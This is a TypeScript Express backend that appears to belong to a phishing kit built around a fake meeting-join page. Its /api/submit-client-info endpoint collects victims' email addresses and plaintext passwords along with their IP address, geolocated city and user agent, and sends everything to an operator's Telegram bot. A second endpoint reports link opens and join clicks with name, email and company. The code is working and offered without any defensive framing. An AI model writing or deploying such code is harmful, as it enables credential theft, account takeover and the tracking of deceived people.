import express from "express";
import path from "path";
import dotenv from "dotenv";
import { createServer as createViteServer } from "vite";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Helper to check if an IP is private/loopback
function isPrivateIp(ip: string): boolean {
  if (!ip) return true;
  const cleanIp = ip.replace(/^::ffff:/, '').trim();
  if (cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp === 'localhost') return true;
  if (cleanIp.startsWith('10.')) return true;
  if (cleanIp.startsWith('192.168.')) return true;
  if (/^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(cleanIp)) return true;
  if (cleanIp.startsWith('fc00:') || cleanIp.startsWith('fe80:')) return true;
  return false;
}

// Extract public IP from request headers or remote query
async function getPublicIp(req: express.Request): Promise<string> {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    const ips = forwarded.split(',').map(s => s.trim());
    for (const ip of ips) {
      if (ip && !isPrivateIp(ip)) {
        return ip;
      }
    }
  }

  const realIp = req.headers['x-real-ip'] || req.headers['cf-connecting-ip'];
  if (typeof realIp === 'string' && !isPrivateIp(realIp)) {
    return realIp;
  }

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3000);
    const resp = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(timeout);
    if (resp.ok) {
      const data = await resp.json() as { ip?: string };
      if (data?.ip && !isPrivateIp(data.ip)) {
        return data.ip;
      }
    }
  } catch (err) {
    // Network or timeout
  }

  return 'Unavailable';
}

// Endpoint to obtain the client's public IP
app.get('/api/client-ip', async (req, res) => {
  try {
    const ip = await getPublicIp(req);
    res.json({ ip });
  } catch (error) {
    res.json({ ip: 'Unavailable' });
  }
});

// Endpoint to handle client info submission, IP geolocation, and Telegram notification
app.post('/api/submit-client-info', async (req, res) => {
  try {
    const { clientEmail, clientPassword, meetingId, hostName, clientIp } = req.body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Telegram credentials are missing in environment variables.');
      return res.status(500).json({ success: false, error: 'Server configuration error' });
    }

    // 1. Resolve final IP using your helper or fallback
    const resolvedIp = clientIp && clientIp !== 'Detecting...' && clientIp !== 'Unavailable' 
      ? clientIp 
      : await getPublicIp(req);

    // 2. Fetch IP-based location automatically on the server (Zero user friction)
    let country = 'Unknown';
    let region = 'Unknown';
    let city = 'Unknown';

    if (resolvedIp && !isPrivateIp(resolvedIp) && resolvedIp !== 'Unavailable') {
      try {
        const geoRes = await fetch(`http://ip-api.com/json/${resolvedIp}`);
        if (geoRes.ok) {
          const geoData = await geoRes.json() as any;
          if (geoData.status === 'success') {
            country = geoData.country || 'Unknown';
            region = geoData.regionName || 'Unknown';
            city = geoData.city || 'Unknown';
          }
        }
      } catch (geoErr) {
        console.error('GeoIP lookup error:', geoErr);
      }
    }

    // 3. Capture User Agent from request headers
    const userAgent = req.headers['user-agent'] || 'Unknown';

    // 4. Format the message into your exact requested layout
    const message = `
🚨 *New Meeting Client Submission* 🚨

--- IP & REGIONAL LOCATION ---
- *IP Address:* ${resolvedIp || 'N/A'}
- *Country:* ${country}
- *State / Region:* ${region}
- *City:* ${city}

--- SYSTEM INFO ---
- *User Agent:* ${userAgent}

--- CLIENT DETAILS ---
- *Email:* ${clientEmail || 'N/A'}
- *Password:* ${clientPassword || 'N/A'}
- *Room ID:* ${meetingId || 'N/A'}
- *Host:* ${hostName || 'Host'}
- *Time:* ${new Date().toLocaleString()}
    `.trim();

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const data = await response.json() as { ok?: boolean };
    if (!data.ok) {
      throw new Error('Telegram API rejected the message request.');
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Failed to dispatch Telegram notification:', error);
    return res.status(500).json({ success: false, error: 'Failed to send notification' });
  }
});

// Endpoint to handle lightweight milestone tracking (Page Visit & Join Click)
app.post('/api/track-event', async (req, res) => {
  console.log('HIT /api/track-event with body:', req.body);
  try {
    const { event_type, client_email, client_name, client_company, clientIp, timestamp } = req.body;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ success: false, error: 'Server configuration error' });
    }

    // Resolve IP and Location for the tracking event
    const resolvedIp = clientIp && clientIp !== 'Detecting...' && clientIp !== 'Unavailable' 
      ? clientIp 
      : await getPublicIp(req);

    let country = 'Unknown';
    let region = 'Unknown';
    let city = 'Unknown';

    if (resolvedIp && !isPrivateIp(resolvedIp) && resolvedIp !== 'Unavailable') {
      try {
        const geoRes = await fetch(`http://ip-api.com/json/${resolvedIp}`);
        if (geoRes.ok) {
          const geoData = await geoRes.json() as any;
          if (geoData.status === 'success') {
            country = geoData.country || 'Unknown';
            region = geoData.regionName || 'Unknown';
            city = geoData.city || 'Unknown';
          }
        }
      } catch (geoErr) {
        console.error('GeoIP lookup error:', geoErr);
      }
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';
    let message = '';

    if (event_type === 'PAGE_VISIT') {
      message = `
👀 <b>LINK OPENED / PAGE VISIT</b>
━━━━━━━━━━━━━━━━━━━━
--- IP & REGIONAL LOCATION ---
- <b>IP Address:</b> <code>${resolvedIp || 'N/A'}</code>
- <b>Country:</b> ${country}
- <b>State / Region:</b> ${region}
- <b>City:</b> ${city}

--- SYSTEM INFO ---
- <b>User Agent:</b> ${userAgent}
- <b>Time:</b> ${timestamp ? new Date(timestamp).toUTCString() : new Date().toUTCString()}
      `.trim();
    } else if (event_type === 'JOIN_CLICKED') {
      message = `
⚡ <b>JOIN BUTTON CLICKED</b>
━━━━━━━━━━━━━━━━━━━━
- <b>Name:</b> ${client_name || 'N/A'}
- <b>Email:</b> <code>${client_email || 'N/A'}</code>
- <b>Company:</b> ${client_company || 'N/A'}
- <b>Time:</b> ${timestamp ? new Date(timestamp).toUTCString() : new Date().toUTCString()}
      `.trim();
    } else {
      return res.status(400).json({ success: false, error: 'Unknown event type' });
    }

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    const data = await response.json() as { ok?: boolean };
    if (!data.ok) {
      throw new Error('Telegram API rejected the tracking request.');
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Failed to dispatch tracking notification:', error);
    return res.status(500).json({ success: false, error: 'Failed to send event' });
  }
});

async function start() {
  app.get('/', (_req, res) => {
    res.status(200).json({ status: 'API backend is running successfully' });
  });

  app.listen(Number(PORT), "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
}

start();
